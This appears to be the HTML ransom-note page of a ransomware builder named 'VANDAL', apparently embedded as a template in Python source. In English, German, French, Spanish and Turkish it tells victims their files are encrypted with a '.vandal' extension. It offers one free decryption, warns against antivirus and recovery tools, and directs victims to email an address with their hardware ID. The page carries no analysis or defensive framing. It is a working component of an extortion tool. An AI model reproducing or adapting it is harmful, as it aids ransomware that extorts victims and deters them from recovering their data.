<!DOCTYPE html><html><head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <meta http-equiv="x-ua-compatible" content="ie=9"> <title>VANDAL</title> <style> a, abbr, acronym, address, applet, article, aside, audio, b, big, blockquote, body, canvas, caption, center, cite, code, dd, del, details, dfn, div, dl, dt, em, embed, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, header, hgroup, html, i, iframe, img, ins, kbd, label, legend, li, mark, menu, nav, object, ol, output, p, pre, q, ruby, s, samp, section, small, span, strike, strong, sub, summary, sup, table, tbody, td, tfoot, th, thead, time, tr, tt, u, ul, var, video {{ margin:0; padding:0; border:0; font-size:100%; font:inherit; vertical-align:baseline; }} article, aside, details, figcaption, figure, footer, header, hgroup, menu, nav, section {{ display:block; }} body {{ line-height:1; }} ol, ul {{ list-style:none; }} blockquote, q {{ quotes:none; }} blockquote:after, blockquote:before, q:after, q:before {{ content:''; content:none; }} table {{ border-collapse:collapse; border-spacing:0; }} body, html {{ background-color:#dadada; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight:600; font-size:16px; }} a {{ text-decoration:none; color:#0483ab; }} .header {{ margin-top:15px; margin-bottom:5px; width:100%; }} .header h1 {{ width:97%; text-align:left; font-size:30px; font-weight:900; margin:auto; }} .header h1 span#black {{ display:inline-block; color:#000; margin-right:0; padding:2px 2px; }} .header h1 span#hunter {{ display:inline-block; color:#e90303; background-color:#000; padding:2px 8px; margin-left:0; }} .header h1 span#hunter span#version {{ font-size:12px; }} .message {{ margin:auto; margin-top:2%; }} .message .head-encrypted-msg h1 {{ font-size:330%; width:97%; margin:auto; text-align:center; font-weight:700; }} .message .head-encrypted-msg h1 span {{ display:inline-block; color:#000; background-color:#e90303; padding:0 8px 0 8px; margin-right:3px; }} .message .head-attention-msg {{ width:97%; margin:auto; text-align:center; margin-top:1%; border:1px solid #e90303; background-color:#f1caca; border-radius:5px; font-size:250%; padding-top:10px; padding-bottom:10px; }} .message .head-attention-msg p {{ margin-bottom:.5%; }} .message .head-attention-msg p span {{ color:#e90303; }} .content {{ margin:auto; margin-top:2%; }} .content .content-head-msg {{ font-size:32px; text-align:left; font-weight:600; }} .content .content-boxes {{ margin:auto; margin-top:2%; }} .content .box {{ width:96%; margin:auto; border-radius:5px; margin-bottom:30px; }} .content .content-left-box {{ background-color:#c5cfd8; padding:40px 0 40px 20px; font-size:24px; position:relative; border-left:15px solid #1878cf; }} .content .content-left-box h3.left-box-title {{ background-color:#1878cf; display:inline-block; padding:10px 10px; border-radius:5px; color:#fff; position:absolute; top:-22px; margin-left:auto; margin-right:auto; left:0; right:0; width:20%; text-align:center; }} .content .content-left-box div.content-contact-directly * {{ font-weight:600!important; line-height:1.4em; }} .content .content-left-box div.content-contact-directly h4 {{ font-size:24px; font-weight:500; margin-top:8px; }} .content .content-left-box div.content-contact-directly h4#tox {{ font-weight:600; display:inline-block; margin-left:3px; }} .content .content-left-box div.content-contact-directly div.tox-id {{ margin-left:6%; }} .content .content-left-box div.content-contact-directly h4#tox-id {{ font-size:24px; }} .content .content-left-box div.content-contact-directly p#tox-id-p {{ font-size:16px; }} .content .content-left-box div.content-contact-directly h4#download-tox {{ display:inline-block; margin-left:6%; }} .content .content-left-box div.content-contact-directly p#download-tox-p {{ display:inline-block; }} .content .content-left-box div.content-contact-directly h4#email {{ display:inline-block; font-weight:600; margin-left:3px; }} .content .content-left-box div.content-contact-directly p#email-p {{ display:inline-block; font-size:24px; margin-left:8px; }} .content .content-left-box div.content-contact-directly h4#user-id {{ font-weight:500; margin-left:3px; }} .content .content-left-box div.content-contact-directly h4#user-id span {{ color:#e90303; }} .content .content-left-box div.content-contact-tor {{ margin-top:50px; font-weight:600!important; }} .content .content-left-box div.content-contact-tor h3 {{ font-size:24px; }} .content .content-left-box div.content-contact-tor h3 span {{ color:#e90303; }} .content .content-left-box div.content-contact-tor div.content-tor-inside {{ margin-left:6; margin-top:10px; }} .content .content-left-box div.content-contact-tor div.content-tor-inside p {{ margin-top:8px; }} .content .content-left-box div.content-contact-tor div.content-tor-inside p img {{ position:relative; bottom:-3px; }} .content .content-right-box {{ background-color:#efb0b0; padding:40px 0 40px 20px; font-size:24px; position:relative; border-left:15px solid #e90303; }} .content .content-right-box h3.right-box-title {{ background-color:#e90303; display:inline-block; padding:10px 10px; border-radius:5px; color:#fff; position:absolute; top:-22px; margin-left:auto; margin-right:auto; left:0; right:0; width:20%; text-align:center; }} .content .content-right-box p {{ color:#000; font-size:22px; font-weight:600; margin-top:9px; line-height:1.4em; }} .content .content-left-box p {{ color:#000; font-size:22px; font-weight:600; margin-top:9px; line-height:1.4em; }} .content .content-left-box p span {{ color:#e90303; font-weight:700; font-size:24px; }} .language-selector {{ margin: 20px; text-align: center; position: absolute; }} </style></head><body> <div class="header"> <div class="language-selector"> <label for="language-select">LANGUAGE:</label> <select id="language-select"> <option value="en">ENGLISH</option> <option value="de">DEUTSCH</option> <option value="fr">FRANÇAIS</option> <option value="es">ESPAÑOL</option> <option value="tr">TÜRKÇE</option> </select> </div> </div> <div class="message"> <div class="head-encrypted-msg"> <h1></h1> </div> <div class="head-attention-msg"> <p></p> </div> </div> <div class="content"> <div class="content-boxes"> <div class="content-right-box box"> <h3 class="right-box-title"></h3> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> </div> <div class="content-left-box box"> <h3 class="left-box-title"></h3> <p></p> </div> </div> </div> <script> const translations = {{ en: {{ encryptedMsg: "YOUR <span>FILES</span> HAVE BEEN <span>ENCRYPTED</span> !", attentionMsg: "The extension of all encrypted files: <span>.vandal</span>", rightBoxTitle: "ATTENTION", rightBoxContent: [ "Our encryption algorithm is very strong and your files are well-protected.", "The only way to recover your files is to cooperate with us and obtain a decryption tool.", "To prove our seriousness, we will decrypt one file for free.", "Just send us an email with an encrypted file and your HWID included.", "DO NOT attempt to modify the files on your own and DO NOT use any third-party software or antivirus solutions to restore your data.", "This could cause damage to the files and result in the loss of all data." ], leftBoxTitle: "CONTACT", leftBoxContent: "To contact us, you can send an e-mail to <span>test@proton.me</span> with the subject <span>[{self.hwid}]</span> ." }}, de: {{ encryptedMsg: "IHRE <span>DATEIEN</span> WURDEN <span>VERSCHLÜSSELT</span> !", attentionMsg: "Die Erweiterung aller verschlüsselten Dateien: <span>.vandal</span>", rightBoxTitle: "ACHTUNG", rightBoxContent: [ "Unser Verschlüsselungsalgorithmus ist sehr stark und Ihre Dateien sind gut geschützt.", "Der einzige Weg, um Ihre Dateien wiederherzustellen, ist die Zusammenarbeit mit uns und das Erhalten eines Entschlüsselungstools.", "Um unsere Ernsthaftigkeit zu beweisen, werden wir eine Datei kostenlos entschlüsseln.", "Schicken Sie uns einfach eine E-Mail mit einer verschlüsselten Datei und Ihrer HWID.", "Versuchen Sie NICHT, die Dateien selbst zu ändern, und verwenden Sie KEINE Drittanbieter-Software oder Antivirenlösungen, um Ihre Daten wiederherzustellen.", "Dies könnte die Dateien beschädigen und zum Verlust aller Daten führen." ], leftBoxTitle: "KONTAKT", leftBoxContent: "Um uns zu kontaktieren, können Sie eine E-Mail an <span>test@proton.me</span> mit dem Betreff <span>[{self.hwid}]</span> senden." }}, fr: {{ encryptedMsg: "VOS <span>FICHIERS</span> ONT ÉTÉ <span>CRYPTÉS</span> !", attentionMsg: "L'extension de tous les fichiers cryptés : <span>.vandal</span>", rightBoxTitle: "ATTENTION", rightBoxContent: [ "Notre algorithme de chiffrement est très puissant et vos fichiers sont bien protégés.", "Le seul moyen de récupérer vos fichiers est de coopérer avec nous et d'obtenir un outil de déchiffrement.", "Pour prouver notre sérieux, nous déchiffrerons un fichier gratuitement.", "Envoyez-nous simplement un e-mail avec un fichier crypté et votre HWID inclus.", "NE TENTEZ PAS de modifier les fichiers vous-même et NE UTILISEZ AUCUN logiciel tiers ou solution antivirus pour restaurer vos données.", "Cela pourrait endommager les fichiers et entraîner la perte de toutes les données." ], leftBoxTitle: "CONTACT", leftBoxContent: "Pour nous contacter, vous pouvez envoyer un e-mail à <span>test@proton.me</span> avec pour objet <span>[{self.hwid}]</span> ." }}, es: {{ encryptedMsg: "¡TUS <span>ARCHIVOS</span> HAN SIDO <span>ENCRIPTADOS</span> !", attentionMsg: "La extensión de todos los archivos encriptados: <span>.vandal</span>", rightBoxTitle: "ATENCIÓN", rightBoxContent: [ "Nuestro algoritmo de cifrado es muy fuerte y tus archivos están bien protegidos.", "La única forma de recuperar tus archivos es cooperar con nosotros y obtener una herramienta de descifrado.", "Para probar nuestra seriedad, descifraremos un archivo de forma gratuita.", "Simplemente envíanos un correo electrónico con un archivo encriptado y tu HWID incluido.", "NO intentes modificar los archivos por tu cuenta y NO uses ningún software de terceros ni soluciones antivirus para restaurar tus datos.", "Esto podría dañar los archivos y resultar en la pérdida de todos los datos." ], leftBoxTitle: "CONTACTO", leftBoxContent: "Para contactarnos, puedes enviar un correo electrónico a <span>test@proton.me</span> con el asunto <span>[{self.hwid}]</span> ." }}, tr: {{ encryptedMsg: "DOSYALARINIZ <span>ŞİFRELENDİ</span> !", attentionMsg: "Tüm şifrelenmiş dosyaların uzantısı: <span>.vandal</span>", rightBoxTitle: "DİKKAT", rightBoxContent: [ "Şifreleme algoritmamız çok güçlüdür ve dosyalarınız iyi korunmaktadır.", "Dosyalarınızı kurtarmanın tek yolu bizimle işbirliği yapmak ve bir şifre çözme aracı almaktır.", "Ciddiyetimizi kanıtlamak için bir dosyayı ücretsiz olarak çözeceğiz.", "Sadece şifrelenmiş bir dosya ve HWID'niz ile birlikte bize bir e-posta gönderin.", "Dosyalarınızı kendiniz DEĞİŞTİRMEYİN ve verilerinizi geri yüklemek için üçüncü parti yazılımları veya antivirüs çözümleri KULLANMAYIN.", "Bu dosyalarınıza zarar verebilir ve tüm verilerinizi kaybetmenize neden olabilir." ], leftBoxTitle: "İLETİŞİM", leftBoxContent: "Bizimle iletişime geçmek için, <span>test@proton.me</span> adresine <span>[{self.hwid}]</span> konu başlığıyla bir e-posta gönderebilirsiniz." }} }}; document.getElementById('language-select').addEventListener('change', function() {{ const selectedLang = this.value; updateContent(selectedLang); }}); function updateContent(lang) {{ const content = translations[lang]; document.querySelector('.head-encrypted-msg h1').innerHTML = content.encryptedMsg; document.querySelector('.head-attention-msg p').innerHTML = content.attentionMsg; const rightBox = document.querySelector('.content-right-box'); rightBox.querySelector('.right-box-title').innerHTML = content.rightBoxTitle; const rightBoxContent = rightBox.querySelectorAll('p'); content.rightBoxContent.forEach((text, index) => {{ rightBoxContent[index].innerHTML = text; }}); const leftBox = document.querySelector('.content-left-box'); leftBox.querySelector('.left-box-title').innerHTML = content.leftBoxTitle; leftBox.querySelector('p').innerHTML = content.leftBoxContent; }} updateContent('en'); </script></body></html>
